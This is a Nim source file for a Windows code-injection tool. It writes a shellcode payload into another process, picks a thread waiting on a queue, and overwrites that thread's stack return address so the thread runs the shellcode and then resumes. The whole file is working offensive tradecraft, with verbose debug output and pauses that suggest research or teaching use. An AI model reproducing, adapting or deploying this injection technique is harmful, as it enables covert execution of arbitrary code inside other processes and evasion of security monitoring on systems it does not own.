import winim
import winim/lean
import tables
import strformat

# Imports of custom modules
import ../utils/ntdll_api
import ../utils/threads_util
import ../utils/memory_utils
import ../utils/thread_constants
import ../utils/debug
import ../shellcode/stub_and_shellcode

# Main function to find waiting threads and inject shellcode
proc runInjected*(pid: DWORD, shellcodePtr: ULONGLONG, waitReason: DWORD): bool =
  echo &"Enumerating threads of PID: {pid}"
  var threadsInfo = initTable[DWORD, threads_util.ThreadInfo]()
  
  if not threads_util.fetchThreadsInfo(pid, threadsInfo):
    echo "Error getting thread information"
    return false
  
  let hProcess = OpenProcess(PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION, WINBOOL(FALSE), pid)
  if hProcess == 0:
    echo "Error opening process with read/write access"
    return false
  
  var ctx: CONTEXT
  var suitableRetPtr: ULONGLONG = 0
  var suitableRet: ULONGLONG = 0
  var targetTid: DWORD = 0
  
  echo &"Threads: {threadsInfo.len}"
  
  for tid, info in threadsInfo.pairs:
    if not info.isExtended:
      echo "Incomplete information for thread"
      CloseHandle(hProcess)
      return false
    
    if info.ext.state == Waiting:
      echo &"TID: {info.tid} : wait reason: {info.ext.waitReason}"
      
      if info.ext.waitReason != waitReason or not threads_util.readContext(info.tid, ctx):
        continue
      
      let ret = threads_util.readReturnPtr[ULONGLONG](hProcess, ctx.Rsp)
      echo &"RET: 0x{ret:X}"
      
      if suitableRetPtr == 0:
        if not memory_utils.checkRetTarget(cast[LPVOID](ret)):
          echo "Return destination not supported. Skipping!"
          continue
        
        suitableRetPtr = ctx.Rsp
        suitableRet = ret
        targetTid = info.tid
        
        echo "\tUsing as target!"
        echo &"Selected TID: {info.tid}, RSP: 0x{suitableRetPtr:X}, Original RET: 0x{suitableRet:X}"
        echo &"Shellcode base: 0x{shellcodePtr:X}, Shellcode entry: 0x{shellcodePtr + 8:X}"
        echo &"Shellcode size: {stub_and_shellcode.payload.len} bytes"
        
        # Show detailed thread information
        threads_util.printThreadInfo(pid, targetTid, ctx)
        
        # Show memory content around the return pointer
        echo "\n[INFO] Examining memory around the return pointer (RSP):"
        memory_utils.dumpMemoryAroundPtr(hProcess, suitableRetPtr)
        
        # Debug pause after selecting the thread
        debug.debugPause("A thread has been selected for injection. Review the data above.")
        break
    else:
      echo &"TID: {tid} NOT waiting, State: {info.ext.state}"
  
  var isInjected = false
  
  if suitableRetPtr != 0:
    # Overwrite the shellcode with the return jump
    var written: SIZE_T = 0
    
    echo "PHASE 1: Writing original return address in the shellcode"
    echo &"Writing 0x{suitableRet:X} at address 0x{shellcodePtr:X}"
    
    # Use the NT native function through our module
    if ntdll_api.WriteProcessMemory(
      hProcess, 
      cast[LPVOID](shellcodePtr), 
      addr suitableRet, 
      sizeof(suitableRet), 
      addr written
    ) != 0 and written == sizeof(suitableRet):
      echo &"Shellcode pointer overwritten! Written: {written}"
      
      # Show the initial content of the shellcode
      echo "\n[INFO] Shellcode content after saving the original return:"
      memory_utils.dumpMemoryAroundPtr(hProcess, shellcodePtr)
      debug.debugPause("Examine the shellcode content with the inserted return.")
    else:
      echo &"Error overwriting shellcode return jump: 0x{GetLastError():X}"
      CloseHandle(hProcess)
      return false
    
    if not memory_utils.protectMemory(pid, cast[LPVOID](shellcodePtr), cast[SIZE_T](stub_and_shellcode.payload.len), PAGE_EXECUTE_READ):
      echo "Error making memory executable!"
      CloseHandle(hProcess)
      return false
    
    let shellcodeExecPtr = shellcodePtr + 8  # After the saved return address
    
    echo "\nPHASE 2: Redirecting return pointer in thread stack"
    echo &"Attempting to overwrite: 0x{suitableRetPtr:X} -> 0x{suitableRet:X} with: 0x{shellcodeExecPtr:X}"
    
    # Show new information about the thread structure before hijacking
    echo "\n[INFO] Thread state before hijacking:"
    discard threads_util.readContext(targetTid, ctx)
    threads_util.printThreadInfo(pid, targetTid, ctx)
    
    echo "\n[INFO] Stack state before modifying the return pointer:"
    memory_utils.dumpMemoryAroundPtr(hProcess, suitableRetPtr)
    
    debug.debugPause("About to modify the return pointer in the stack. Place breakpoints if needed.")
    
    # Use the NT native function to overwrite the return pointer
    if ntdll_api.WriteProcessMemory(
      hProcess, 
      cast[LPVOID](suitableRetPtr), 
      addr shellcodeExecPtr, 
      sizeof(shellcodeExecPtr), 
      addr written
    ) != 0 and written == sizeof(shellcodeExecPtr):
      echo "Return overwritten!"
      
      # Show the stack state after the modification
      echo "\n[INFO] Stack state AFTER modifying the return pointer:"
      memory_utils.dumpMemoryAroundPtr(hProcess, suitableRetPtr)
      
      isInjected = true
      
      echo "\n[PROCESS COMPLETED] Injection Summary"
      echo &"1. Shellcode in memory: 0x{shellcodePtr:X} (size: {stub_and_shellcode.payload.len} bytes)"
      echo &"2. Shellcode entry point: 0x{shellcodeExecPtr:X}"
      echo &"3. Original return address: 0x{suitableRet:X}"
      echo &"4. Stack modified at: 0x{suitableRetPtr:X}"
      echo &"5. Target Thread ID: {targetTid}"
      echo "6. When the thread exits the wait state, it will execute our RET instruction"
      echo "   which will jump to our shellcode instead of the original address"
      
      echo "\n[ANALYSIS] Expected execution flow:"
      echo "1. The thread is waiting in a system function"
      echo "2. When the wait ends, it will continue executing instructions"
      echo "3. Eventually it will reach a RET instruction"
      echo "4. This RET instruction will read the return address from the stack (RSP)"
      echo "5. Instead of the original address, it will now find the address of our shellcode"
      echo "6. The RIP (Instruction Pointer) will jump to our shellcode"
      echo "7. Upon completion, our shellcode will jump to the original address\n"
      
    else:
      echo &"Error overwriting return: 0x{GetLastError():X}"
  
  CloseHandle(hProcess)
  return isInjected

# Function to execute the complete injection
proc executeInjection*(processID: DWORD): bool =
  let memorySize = cast[SIZE_T](stub_and_shellcode.payload.len)
  let shellcodePtr = memory_utils.allocMemoryInProcess(processID, memorySize)
  
  if shellcodePtr == nil:
    echo "Error allocating memory in target process"
    return false
    
  echo &"Memory allocated at 0x{cast[uint64](shellcodePtr):X}"
  
  let isOk = memory_utils.writeMemoryIntoProcess(
    processID, 
    shellcodePtr, 
    unsafeAddr stub_and_shellcode.payload[0], 
    memorySize
  )
  
  if not isOk:
    echo "Error writing shellcode to process"
    return false
    
  echo "Shellcode written successfully"
  
  return runInjected(processID, cast[ULONGLONG](shellcodePtr), WrQueue) 